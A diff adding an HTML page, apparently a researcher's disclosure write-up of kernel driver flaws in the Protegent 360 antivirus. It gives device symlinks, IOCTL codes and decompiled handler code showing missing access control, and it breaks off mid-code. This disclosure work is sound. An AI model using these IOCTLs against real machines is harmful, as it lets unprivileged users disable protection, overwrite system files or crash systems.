@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DreadSec | This Anti-Virus is Malware</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Several kernel vulnerabilities in Protegent 360 by Unistal Systems — CWE-732, CWE-476, CWE-125 across two Windows kernel drivers with zero access control.">
+
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="This Anti-Virus is Malware">
+  <meta property="og:description" content="Several kernel vulnerabilities in Protegent 360 by Unistal Systems — two drivers, zero access control, two BSODs, and a kernel pool OOB read. Any unprivileged user can disable all protection and blue-screen the machine.">
+  <meta property="og:site_name" content="Dreadsec">
+  <meta property="og:url" content="https://dreadsec.co/writeups/protegent-360">
+  <meta property="article:published_time" content="2026-03-26">
+  <meta property="article:author" content="Dreadsec">
+  <meta property="article:tag" content="CWE-732">
+  <meta property="article:tag" content="CWE-476">
+  <meta property="article:tag" content="CWE-125">
+  <meta property="article:tag" content="Kernel">
+  <meta property="article:tag" content="Windows">
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="This Anti-Virus is Malware">
+  <meta name="twitter:description" content="Several kernel vulnerabilities in Protegent 360 — two drivers, zero access control, two BSODs. Any unprivileged user can disable all protection and blue-screen the machine.">
+  <meta name="twitter:site" content="@dreadsec">
+
+
+  <meta name="author" content="Dreadsec">
+  <meta name="keywords" content="CVE, kernel exploit, Windows driver, CWE-732, CWE-476, CWE-125, Protegent 360, Unistal Systems, privilege escalation, BSOD, null pointer dereference, out-of-bounds read">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://dreadsec.co/writeups/protegent-360">
+  <style>
+    :root {
+      --bg-main:#02030a;
+      --bg-panel:#050713;
+      --bg-card:#070918;
+      --accent:#ff1446;
+      --accent-soft:rgba(255,20,70,0.14);
+      --accent-alt:#35b7ff;
+      --text-main:#f5f5f7;
+      --text-muted:#8d91a5;
+      --border-soft:rgba(255,255,255,0.06);
+      --radius-xl:22px;
+      --radius-md:14px;
+      --font-sans:system-ui,-apple-system,BlinkMacSystemFont,"SF Pro Text",sans-serif;
+      --shadow-soft:0 22px 60px rgba(0,0,0,0.9);
+      --transition-fast:.18s ease-out;
+      --transition-med:.26s ease-out;
+    }
+    * {
+      box-sizing:border-box;
+      margin:0;
+      padding:0;
+    }
+    body {
+      font-family:var(--font-sans);
+      background:var(--bg-main);
+      color:var(--text-main);
+      min-height:100vh;
+      overflow-x:hidden;
+    }
+    a {
+      color:inherit;
+      text-decoration:none;
+    }
+
+    .bg-orbit {
+      position:fixed;
+      inset:-40px;
+      background:
+        radial-gradient(circle at top left,rgba(255,20,70,0.14),transparent),
+        radial-gradient(circle at top right,rgba(53,183,255,0.09),transparent),
+        radial-gradient(circle at bottom,rgba(255,20,70,0.08),transparent);
+      mix-blend-mode:screen;
+      pointer-events:none;
+      z-index:-3;
+      animation:bgShift 16s ease-in-out infinite alternate;
+    }
+    @keyframes bgShift {
+      0% {opacity:.6;transform:translate3d(0,0,0);}
+      50% {opacity:1;transform:translate3d(-10px,-6px,0) scale(1.02);}
+      100% {opacity:.85;transform:translate3d(6px,-4px,0);}
+    }
+
+    .bg-grid {
+      position:fixed;
+      inset:0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+      background-size:90px 90px;
+      opacity:.16;
+      pointer-events:none;
+      z-index:-4;
+      animation:gridDrift 38s linear infinite;
+    }
+    @keyframes gridDrift {
+      0% {transform:translate3d(0,0,0);}
+      50% {transform:translate3d(-24px,-18px,0) scale(1.03);}
+      100% {transform:translate3d(0,0,0);}
+    }
+
+    .page-wrap {
+      max-width:1240px;
+      margin:0 auto;
+      padding:20px 16px 40px;
+      position:relative;
+      z-index:1;
+    }
+
+    header {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+      padding:14px 16px;
+      border-radius:var(--radius-xl);
+      background:radial-gradient(circle at top left,rgba(255,20,70,0.12),transparent);
+      border:1px solid var(--border-soft);
+      backdrop-filter:blur(26px);
+      box-shadow:var(--shadow-soft);
+      margin-bottom:18px;
+    }
+    .brand {
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .brand-title {
+      font-size:1.7rem;
+      font-weight:700;
+      letter-spacing:.16em;
+      text-transform:uppercase;
+    }
+    .brand-title span {
+      color:var(--accent);
+    }
+    .brand-sub {
+      font-size:.72rem;
+      letter-spacing:.14em;
+      text-transform:uppercase;
+      color:var(--text-muted);
+    }
+    .nav {
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-size:.78rem;
+      color:var(--text-muted);
+      flex-wrap:wrap;
+    }
+    .nav a {
+      padding:6px 10px;
+      border-radius:999px;
+      border:1px solid transparent;
+      transition:all var(--transition-fast);
+    }
+    .nav a:hover {
+      color:var(--accent);
+      border-color:var(--accent-soft);
+      background:rgba(0,0,0,0.86);
+    }
+    .nav-pill {
+      border-color:var(--accent-soft);
+      color:var(--accent);
+    }
+
+    .progress-shell {
+      width:100%;
+      height:3px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.06);
+      overflow:hidden;
+      margin-bottom:14px;
+    }
+    #scrollProgress {
+      width:0;
+      height:100%;
+      background:linear-gradient(90deg,var(--accent),var(--accent-alt));
+      transform-origin:left center;
+      transform:scaleX(0);
+      transition:transform 0.08s linear;
+    }
+
+    .article-layout {
+      display:grid;
+      grid-template-columns:minmax(0,260px) minmax(0,1fr);
+      gap:20px;
+      align-items:flex-start;
+    }
+
+    .article-meta {
+      background:var(--bg-panel);
+      border-radius:var(--radius-xl);
+      padding:16px 14px 12px;
+      border:1px solid var(--border-soft);
+      box-shadow:var(--shadow-soft);
+      backdrop-filter:blur(24px);
+      position:sticky;
+      top:20px;
+    }
+    .back-link {
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      font-size:.76rem;
+      color:var(--text-muted);
+      margin-bottom:10px;
+      padding:5px 8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.06);
+      background:rgba(0,0,0,0.6);
+      cursor:pointer;
+      transition:all var(--transition-fast);
+    }
+    .back-link:hover {
+      color:var(--accent);
+      border-color:var(--accent-soft);
+    }
+    .back-link span.arrow {
+      font-size:.72rem;
+    }
+
+    .cve-badge {
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:4px 9px;
+      border-radius:999px;
+      background:var(--accent-soft);
+      color:var(--accent);
+      font-size:.7rem;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      margin-bottom:4px;
+    }
+    .cve-badge-row {
+      display:flex;
+      flex-wrap:wrap;
+      gap:4px;
+      margin-bottom:10px;
+    }
+    .meta-block {
+      font-size:.72rem;
+      color:var(--text-muted);
+      margin-bottom:10px;
+      line-height:1.5;
+    }
+    .meta-block strong {
+      color:var(--accent-alt);
+      font-weight:500;
+    }
+
+    .article-toc-title {
+      font-size:.72rem;
+      text-transform:uppercase;
+      letter-spacing:.13em;
+      color:var(--text-muted);
+      margin-top:12px;
+      margin-bottom:6px;
+    }
+    .article-toc {
+      list-style:none;
+      font-size:.72rem;
+      display:flex;
+      flex-direction:column;
+      gap:3px;
+    }
+    .article-toc a {
+      color:var(--text-muted);
+      padding:3px 0;
+      border-left:2px solid transparent;
+      padding-left:8px;
+      transition:all var(--transition-fast);
+    }
+    .article-toc a:hover {
+      color:var(--accent-alt);
+      border-color:var(--accent-soft);
+    }
+    .article-toc a.active {
+      color:var(--accent);
+      border-color:var(--accent);
+    }
+
+    .article-main {
+      background:var(--bg-panel);
+      border-radius:var(--radius-xl);
+      padding:18px 16px 18px;
+      border:1px solid var(--border-soft);
+      box-shadow:var(--shadow-soft);
+      backdrop-filter:blur(24px);
+    }
+
+    .article-title {
+      font-size:1.5rem;
+      font-weight:650;
+      line-height:1.3;
+      margin-bottom:6px;
+    }
+    .article-subtitle {
+      font-size:.82rem;
+      color:var(--text-muted);
+      margin-bottom:12px;
+    }
+    .article-meta-row {
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      font-size:.7rem;
+      color:var(--text-muted);
+      margin-bottom:12px;
+    }
+    .article-meta-pill {
+      display:inline-flex;
+      align-items:center;
+      gap:4px;
+      padding:3px 8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.08);
+      background:rgba(0,0,0,0.6);
+    }
+    .dot {
+      width:4px;
+      height:4px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.32);
+    }
+
+    .article-tag-row {
+      display:flex;
+      flex-wrap:wrap;
+      gap:6px;
+      margin-bottom:14px;
+    }
+    .article-tag {
+      font-size:.64rem;
+      padding:3px 8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.1);
+      background:rgba(3,4,12,0.98);
+      color:var(--accent-alt);
+    }
+
+    .callout-tldr {
+      border-radius:var(--radius-md);
+      border:1px solid rgba(255,255,255,0.14);
+      background:linear-gradient(135deg,rgba(53,183,255,0.1),rgba(2,3,12,0.98));
+      padding:10px 11px;
+      font-size:.76rem;
+      margin-bottom:18px;
+    }
+    .callout-tldr-title {
+      text-transform:uppercase;
+      letter-spacing:.14em;
+      font-size:.64rem;
+      color:var(--accent-alt);
+      margin-bottom:4px;
+    }
+    .callout-tldr p {
+      color:var(--text-main);
+      line-height:1.6;
+    }
+
+    .article-section {
+      margin-bottom:20px;
+      padding-left:6px;
+      border-left:2px solid rgba(255,255,255,0.06);
+    }
+    .article-section h2 {
+      font-size:1rem;
+      margin-bottom:6px;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+    }
+    .article-section h3 {
+      font-size:.88rem;
+      margin-top:12px;
+      margin-bottom:6px;
+      color:var(--accent-alt);
+    }
+    .article-section p {
+      font-size:.8rem;
+      color:var(--text-muted);
+      line-height:1.7;
+      margin-bottom:8px;
+    }
+    .article-section ul, .article-section ol {
+      padding-left:16px;
+      margin-bottom:8px;
+    }
+    .article-section li {
+      font-size:.8rem;
+      color:var(--text-muted);
+      line-height:1.7;
+      margin-bottom:4px;
+    }
+    .article-section strong {
+      color:var(--text-main);
+    }
+
+    .code-block {
+      font-family:ui-monospace,Menlo,Consolas,monospace;
+      font-size:.74rem;
+      background:#050713;
+      border-radius:var(--radius-md);
+      border:1px solid rgba(255,255,255,0.14);
+      padding:8px 10px;
+      margin:8px 0;
+      overflow-x:auto;
+      position:relative;
+    }
+    .code-block-label {
+      position:absolute;
+      top:4px;
+      right:8px;
+      font-size:.6rem;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      color:var(--text-muted);
+    }
+    .code-block pre {
+      margin-top:10px;
+      white-space:pre;
+    }
+
+    .note-box {
+      border-radius:var(--radius-md);
+      border:1px dashed rgba(255,255,255,0.2);
+      background:rgba(5,7,18,0.9);
+      padding:8px 10px;
+      font-size:.76rem;
+      color:var(--text-muted);
+      margin-top:10px;
+      margin-bottom:10px;
+    }
+
+    .vuln-table {
+      width:100%;
+      border-collapse:collapse;
+      font-size:.74rem;
+      margin:10px 0;
+    }
+    .vuln-table th {
+      text-align:left;
+      padding:6px 8px;
+      border-bottom:1px solid rgba(255,255,255,0.14);
+      color:var(--accent-alt);
+      font-weight:500;
+      text-transform:uppercase;
+      letter-spacing:.08em;
+      font-size:.66rem;
+    }
+    .vuln-table td {
+      padding:5px 8px;
+      border-bottom:1px solid rgba(255,255,255,0.04);
+      color:var(--text-muted);
+      vertical-align:top;
+    }
+    .vuln-table code {
+      color:var(--accent);
+      font-size:.72rem;
+    }
+    .vuln-table tr:hover td {
+      background:rgba(255,255,255,0.02);
+    }
+
+    .section-divider {
+      border:none;
+      height:1px;
+      background:linear-gradient(90deg,transparent,rgba(255,20,70,0.3),transparent);
+      margin:24px 0;
+    }
+
+    .footer-meta {
+      margin-top:18px;
+      padding-top:10px;
+      border-top:1px solid rgba(255,255,255,0.08);
+      font-size:.72rem;
+      color:var(--text-muted);
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      justify-content:space-between;
+    }
+
+    @media (max-width:860px) {
+      header {
+        flex-direction:column;
+        align-items:flex-start;
+      }
+      .page-wrap {
+        padding:16px 14px 32px;
+      }
+      .article-layout {
+        grid-template-columns:1fr;
+      }
+      .article-meta {
+        position:static;
+        margin-bottom:12px;
+      }
+    }
+
+    @media (max-width:520px) {
+      .page-wrap {
+        padding:14px 10px 26px;
+      }
+      header {
+        padding:10px 12px;
+      }
+      .brand-title {
+        font-size:1.45rem;
+      }
+      .brand-sub {
+        font-size:.68rem;
+      }
+      .nav {
+        font-size:.72rem;
+      }
+      .article-main {
+        padding:14px 12px 16px;
+      }
+      .article-title {
+        font-size:1.25rem;
+      }
+      .article-section h2 {
+        font-size:.92rem;
+      }
+      .article-section p,
+      .article-section li {
+        font-size:.78rem;
+      }
+      .code-block {
+        font-size:.7rem;
+      }
+      .code-block pre {
+        white-space:pre;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <div class="bg-orbit"></div>
+
+  <div class="page-wrap">
+    <header>
+      <div class="brand">
+        <div class="brand-title">dread<span>sec</span>&#9760;&#65038;&#65038;</div>
+        <div class="brand-sub">vulnerability &amp; security research &bull; whiskey and 0xcc</div>
+      </div>
+      <nav class="nav">
+        <a href="https://dreadsec.co" class="nav-pill">main</a>
+        <a href="https://dreadsec.co">write-ups</a>
+      </nav>
+    </header>
+
+    <div class="progress-shell">
+      <div id="scrollProgress"></div>
+    </div>
+
+    <main class="article-layout">
+      <aside class="article-meta">
+        <button class="back-link" type="button" onclick="window.location.href='https://dreadsec.co'">
+          <span class="arrow">&#10235;</span>
+          <span>back to index</span>
+        </button>
+
+        <div class="cve-badge-row">
+          <div class="cve-badge"><span>CVE-2026-38763</span></div>
+          <div class="cve-badge"><span>CVE-2026-38764</span></div>
+          <div class="cve-badge"><span>CVE-2026-38765</span></div>
+          <div class="cve-badge"><span>CVE-2026-38766</span></div>
+        </div>
+
+        <div class="meta-block">
+          <div><strong>Category:</strong> Exploit Development</div>
+          <div><strong>Published:</strong> May 21, 2026</div>
+          <div><strong>Read time:</strong> ~20 min</div>
+          <div><strong>Difficulty:</strong> Intermediate</div>
+          <div><strong>Target:</strong> Protegent 360 v2.0.0.4</div>
+          <div><strong>Vendor:</strong> Unistal Systems Pvt. Ltd.</div>
+        </div>
+
+        <div class="article-toc-title">sections</div>
+        <ul class="article-toc" id="articleToc">
+          <li><a href="#intro">What's Protegent 360?</a></li>
+          <li><a href="#targets">The Targets</a></li>
+          <li><a href="#architecture">Architecture Overview</a></li>
+          <li><a href="#cve1">Secure Folders ACL</a></li>
+          <li><a href="#cve2">Secure Folders BSOD</a></li>
+          <li><a href="#cve3">File Filter ACL</a></li>
+          <li><a href="#cve4">File Filter BSOD</a></li>
+          <li><a href="#cve5">File Filter OOB Read</a></li>
+          <li><a href="#recommendations">How to Fix This</a></li>
+        </ul>
+      </aside>
+
+      <article class="article-main">
+        <header>
+          <h1 class="article-title">This Anti-Virus is Malware</h1>
+          <p class="article-subtitle">
+            A deep dive into several kernel vulnerabilities in Unistal Systems' "antivirus" product
+          </p>
+
+          <div class="article-meta-row">
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>insecure access control</span>
+            </div>
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>null pointer dereference</span>
+            </div>
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>out-of-bounds read</span>
+            </div>
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>privilege escalation</span>
+            </div>
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>denial of service</span>
+            </div>
+          </div>
+
+          <div class="article-tag-row">
+            <a href="https://cwe.mitre.org/data/definitions/732.html" class="article-tag">CWE-732</a>
+            <a href="https://cwe.mitre.org/data/definitions/476.html" class="article-tag">CWE-476</a>
+            <a href="https://cwe.mitre.org/data/definitions/125.html" class="article-tag">CWE-125</a>
+            <span class="article-tag">Kernel</span>
+            <span class="article-tag">CVE / Zero-Day</span>
+            <span class="article-tag">WDM</span>
+          </div>
+        </header>
+
+        <section class="callout-tldr" id="tldr">
+          <div class="callout-tldr-title">tl;dr</div>
+          <p>
+            Protegent 360 v2.0.0.4 (latest as of disclosure) by Unistal Systems ships two kernel drivers with zero access control on their device objects. Any unprivileged local user can disable all security filtering, overwrite protected system files in <code>C:\Windows\system32</code>, blue-screen the machine at will, and read adjacent kernel pool memory.
+          </p>
+        </section>
+
+        <section class="article-section" id="intro">
+          <h2>So What's Protegent 360?</h2>
+          <p>
+            <strong>NOTE:</strong> Before reading this, please go watch <a href="https://www.youtube.com/watch?v=e2qY8JtjJag" style="color:var(--accent-alt);text-decoration:underline">this</a> video for context on this shitty software. You can thank Joel for introducing so many to the monstrosity that is Protegent.
+          </p>
+          <p>
+            I'm honestly surprised there were no entries for this thing on MITRE because, just by looking at it, it's a gold mine. It's probably because no one wants to be associated with this shit, so I'll be the one to volunteer.
+          </p>
+          <p>
+            Alright, so, <strong>Protegent 360</strong> version 2.0.0.4 is a made-in-India security product by <strong>Unistal Systems Pvt. Ltd.</strong>, and it's pretty popular in some countries, for some reason. It ships two Windows kernel-mode drivers that are supposed to protect your files and processes from tampering, but what it actually does is install two wide-open backdoors into ring-0. It's also apparently the "<a href="https://protegent360.com/protegent-antivirus-demo-download" style="color:var(--accent-alt);text-decoration:underline">World's Only Antivirus with Cloud Technology</a>" or something? What?
+          </p>
+          <p>
+            In that sense, it might as well be malware, and between the two drivers, I found several vulnerabilities in this shit. Any unprivileged local user, we're talking a guest account, a kiosk user, literally anyone who can boot a computer, can disable all security filtering, overwrite protected system files, blue-screen the machine, and read kernel memory (without a write-primitive) they have no business touching.
+          </p>
+          <p>
+            Every single vulnerability was confirmed on a live system. Both BSODs are 100% reproducible. The whole thing took an embarrassingly short amount of time to find because, and I cannot stress this enough, <strong>there are zero access control checks in either driver</strong>.
+          </p>
+
+          <table class="vuln-table">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Component</th>
+                <th>Ver</th>
+                <th>CWE</th>
+                <th>What Went Wrong</th>
+                <th>What Happens</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>1</td>
+                <td>Secure Folders (wscsrv.sys)</td>
+                <td>1.0.0.9</td>
+                <td><code>CWE-732</code></td>
+                <td>No access control</td>
+                <td>Any user can nuke all security rules and write to system32</td>
+              </tr>
+              <tr>
+                <td>2</td>
+                <td>Secure Folders (wscsrv.sys)</td>
+                <td>1.0.0.9</td>
+                <td><code>CWE-476</code></td>
+                <td>ExAllocatePool return value? What's that?</td>
+                <td>BSOD: SYSTEM_SERVICE_EXCEPTION</td>
+              </tr>
+              <tr>
+                <td>3</td>
+                <td>Protegent File Filter (pgsecdl.sys)</td>
+                <td>9.0.0.1</td>
+                <td><code>CWE-732</code></td>
+                <td>No access control, again</td>
+                <td>Any user can disable process protection</td>
+              </tr>
+              <tr>
+                <td>4</td>
+                <td>Protegent File Filter (pgsecdl.sys)</td>
+                <td>9.0.0.1</td>
+                <td><code>CWE-476</code></td>
+                <td>They did the same thing, again</td>
+                <td>BSOD: PAGE_FAULT_IN_NONPAGED_AREA</td>
+              </tr>
+              <tr>
+                <td>5</td>
+                <td>Protegent File Filter (pgsecdl.sys)</td>
+                <td>9.0.0.1</td>
+                <td><code>CWE-125</code></td>
+                <td>Never heard of InputBufferLength</td>
+                <td>Reads 2KB of whatever's next to your buffer in kernel pool</td>
+              </tr>
+            </tbody>
+          </table>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="targets">
+          <h2>The Targets</h2>
+
+          <h3>Secure Folders Driver (wscsrv.sys). Version 1.0.0.9</h3>
+
+          <table class="vuln-table">
+            <tbody>
+              <tr><td><strong>Product</strong></td><td>Protegent 360 v2.0.0.4</td></tr>
+              <tr><td><strong>Vendor</strong></td><td>Unistal Systems Pvt. Ltd.</td></tr>
+              <tr><td><strong>SHA256</strong></td><td><code>FEE8FA2AC532E313F4B3B29CCE79E52444FC091068F92981D79AEFA6C584170B</code></td></tr>
+              <tr><td><strong>Device</strong></td><td><code>\Device\FE79F7D853E643089D51EDCDA79805C4</code></td></tr>
+              <tr><td><strong>Symlink</strong></td><td><code>\\.\BE79F7D853E643089D51EDCDA79805C4</code></td></tr>
+              <tr><td><strong>IOCTL Method</strong></td><td>METHOD_BUFFERED (all IOCTLs)</td></tr>
+              <tr><td><strong>IOCTL Access</strong></td><td>FILE_ANY_ACCESS (all IOCTLs)</td></tr>
+            </tbody>
+          </table>
+
+          <p>
+            Here's a fun detail: the driver binary is byte-for-byte identical across installations (same SHA256), but the installer registers it under a <strong>random service name</strong> every time (in this blog, <code>netrdb.sys</code>). Some kind of obscurity-based anti-analysis move, I guess. The driver figures out its own name at runtime by parsing the registry path passed to <code>DriverEntry</code>.
+          </p>
+          <p>
+            It uses this name to build paths for config files in <code>C:\Windows\system32\</code>:
+          </p>
+
+          <table class="vuln-table">
+            <thead><tr><th>File Pattern</th><th>Contents</th><th>Example (service=netrdb)</th></tr></thead>
+            <tbody>
+              <tr><td><code>&lt;name&gt;sr.dat</code></td><td>Serialized path protection rules</td><td><code>netrdbsr.dat</code></td></tr>
+              <tr><td><code>&lt;name&gt;sp.dat</code></td><td>Serialized volume protection rules</td><td><code>netrdbsp.dat</code></td></tr>
+              <tr><td><code>&lt;name&gt;st1.dat</code></td><td>Enabled/disabled state flag</td><td><code>netrdbst1.dat</code></td></tr>
+            </tbody>
+          </table>
+
+          <p>All three files get the <code>HIDDEN | SYSTEM</code> attribute treatment. Very stealthy. Too bad any user can overwrite them via IOCTL.</p>
+
+          <h3>Protegent File Filter Driver (pgsecdl.sys). Version 9.0.0.1</h3>
+
+          <table class="vuln-table">
+            <tbody>
+              <tr><td><strong>Product</strong></td><td>Protegent 360 v2.0.0.4</td></tr>
+              <tr><td><strong>Vendor</strong></td><td>Unistal Systems Pvt. Ltd.</td></tr>
+              <tr><td><strong>SHA256</strong></td><td><code>6E7F947068864177022312B195C5A1B813B041300FC96AE0929E583449F7E904</code></td></tr>
+              <tr><td><strong>Device</strong></td><td><code>\Device\736EC9A3100C4296A350F320...</code> (GUID-based)</td></tr>
+              <tr><td><strong>Symlink</strong></td><td><code>\\.\7774948FAA234777974ED537F346B29F</code></td></tr>
+              <tr><td><strong>PDB Name</strong></td><td><code>msfilter.pdb</code> (can you believe this?)</td></tr>
+              <tr><td><strong>IOCTL Methods</strong></td><td>METHOD_IN_DIRECT (0x01, 0x05, 0x09), METHOD_BUFFERED (0x0C)</td></tr>
+              <tr><td><strong>IOCTL Access</strong></td><td>FILE_ANY_ACCESS (all IOCTLs)</td></tr>
+            </tbody>
+          </table>
+
+          <p>The PDB is called <code>msfilter.pdb</code>. Very official sounding. Very not-Microsoft.</p>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="architecture">
+          <h2>How These Drivers Work (Loosely Speaking)</h2>
+          <p>Both drivers implement a similar architecture:</p>
+          <ul>
+            <li><strong>Minifilter callbacks</strong> via <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltregisterfilter" style="color:var(--accent-alt);text-decoration:underline"><code>FltRegisterFilter</code></a>  - intercept filesystem operations to enforce path-based access rules</li>
+            <li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks" style="color:var(--accent-alt);text-decoration:underline"><strong>ObRegisterCallbacks</strong></a>  - intercept process handle operations to prevent tampering (anti-kill)</li>
+            <li><strong>IOCTL interfaces</strong>  - let a management app load rules, toggle filtering, whitelist processes</li>
+            <li><strong>Persistent config</strong>  - serialize rules to <code>.dat</code> files in <code>C:\Windows\system32\</code> via kernel <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatefile" style="color:var(--accent-alt);text-decoration:underline"><code>ZwCreateFile</code></a>/<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwwritefile" style="color:var(--accent-alt);text-decoration:underline"><code>ZwWriteFile</code></a>, reload on boot</li>
+          </ul>
+          <p>
+            The entire security model rests on one assumption: only the trusted management app will talk to the driver. How is this assumption enforced?
+          </p>
+          <p>
+            It's not. At all. Not even a little bit.
+          </p>
+          <p>
+            No security descriptor on the device object. <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes" style="color:var(--accent-alt);text-decoration:underline"><code>FILE_ANY_ACCESS</code></a> on every IOCTL. The <code>IRP_MJ_CREATE</code> handlers are either pure stubs or just do lazy config loading. Zero calls to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-seaccesscheck" style="color:var(--accent-alt);text-decoration:underline"><code>SeAccessCheck</code></a>, <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck" style="color:var(--accent-alt);text-decoration:underline"><code>SeSinglePrivilegeCheck</code></a>, or anything resembling access control. The front door is wide open and there's a sign on it that says "come on in."
+          </p>
+        </section>
+
+        <hr class="section-divider">
+
+        <section class="article-section" id="cve1">
+          <h2>"Secure" Folders, No Security</h2>
+          <p><strong><a href="https://cwe.mitre.org/data/definitions/732.html" style="color:var(--accent);text-decoration:underline">CWE-732</a>  - Incorrect Permission Assignment for Critical Resource</strong></p>
+
+          <h3>The Problem</h3>
+          <p>
+            The Secure Folders driver creates a device object that any local user can open, exposes eight IOCTLs with <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes" style="color:var(--accent-alt);text-decoration:underline"><code>FILE_ANY_ACCESS</code></a>, and has an <code>IRP_MJ_CREATE</code> handler that performs zero access checks. Not "minimal" access checks. Not "insufficient" access checks. <strong>Zero.</strong>
+          </p>
+          <p>Any unprivileged process can:</p>
+          <ol>
+            <li><strong>Kill the filter</strong>  - set the enabled flag to 0 (IOCTL <code>0x9C40241C</code>)</li>
+            <li><strong>Read driver internals</strong>  - query the enabled state and version (IOCTLs <code>0x9C402420</code>, <code>0x9C402418</code>)</li>
+            <li><strong>Self-whitelist</strong>  - add itself to the minifilter bypass list (IOCTL <code>0x9C402424</code>)</li>
+            <li><strong>Nuke all path protection rules</strong>  - and persist the empty ruleset to disk via kernel-mode <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwwritefile" style="color:var(--accent-alt);text-decoration:underline"><code>ZwWriteFile</code></a> (IOCTL <code>0x9C402400</code>)</li>
+            <li><strong>Nuke all volume protection rules</strong>  - same deal (IOCTL <code>0x9C402408</code>)</li>
+            <li><strong>Trigger serialization/flush</strong> (IOCTLs <code>0x9C402404</code>, <code>0x9C40240C</code>)</li>
+          </ol>
+          <p>
+            The worst part: IOCTLs <code>0x9C402400</code> and <code>0x9C402408</code> cause the driver to overwrite files in <code>C:\Windows\system32\</code> using kernel-mode <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatefile" style="color:var(--accent-alt);text-decoration:underline"><code>ZwCreateFile</code></a>/<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwwritefile" style="color:var(--accent-alt);text-decoration:underline"><code>ZwWriteFile</code></a>. An unprivileged user's <a href="https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol" style="color:var(--accent-alt);text-decoration:underline">DeviceIoControl</a> call gets amplified into kernel-mode writes to a protected system directory. The NTFS ACLs on those files? Completely irrelevant. The driver runs in ring 0 and <code>ZwCreateFile</code> doesn't care about your user token.
+          </p>
+
+          <h3>Let's Look at the Code</h3>
+          <p>Here's the <code>IRP_MJ_CREATE</code> handler. See if you can spot the access control logic:</p>
+
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_131bc</div>
+            <pre>
+uint64_t sub_131bc(int64_t arg1, void* arg2)
+{
+    int64_t rdi = 0xC000000D;      // status_invalid_parameter
+    void* rax_1 = *(arg2 + 0xb8);  // io_stack_location
+
+    if (*(int8_t*)rax_1 == 0)  // irp_mj_create
+    {
+        if (*(data_19170 + 0xB4) == 1)  // config already loaded?
+        {
+            rdi = 0;  // status_success, please come on in
+        }
+        else
+        {
+            sub_119a4(**(data_19170));  // lazy-init: load config from disk
+            rdi = 0;  // status_success, still come on in
+        }
+    }
+
+    *(int32_t*)(arg2 + 0x30) = rdi;
+    IofCompleteRequest(arg2, 0);
+    return (uint64_t)rdi;
+}</pre>
+          </div>
+
+          <p>
+            Did you find the access control? No? That's because there isn't any. No <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-seaccesscheck" style="color:var(--accent-alt);text-decoration:underline"><code>SeAccessCheck</code></a>. No <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck" style="color:var(--accent-alt);text-decoration:underline"><code>SeSinglePrivilegeCheck</code></a>. No token inspection. The function checks if config has been loaded from disk, loads it if not, and says <code>STATUS_SUCCESS</code>. That's it. That's the whole handler.
+          </p>
+
+          <p>Here's the kernel file write function that makes privilege amplification possible:</p>
+
+          <div class="code-block">
+            <div class="code-block-label">decompilation, sub_140f4</div>
+            <pre>
+int64_t sub_140f4(int64_t arg1, int64_t arg2, int64_t arg3)
+{
+    ZwCreateFile(&amp;handle,
+        0x120102,  // synchronize | file_write_data | file_write_attributes
+        &amp;objAttrs,
+        &amp;ioStatus,
+        NULL,      // allocation size
+        6,         // file_attribute_hidden | file_attribute_system
+        1,         // file_share_read
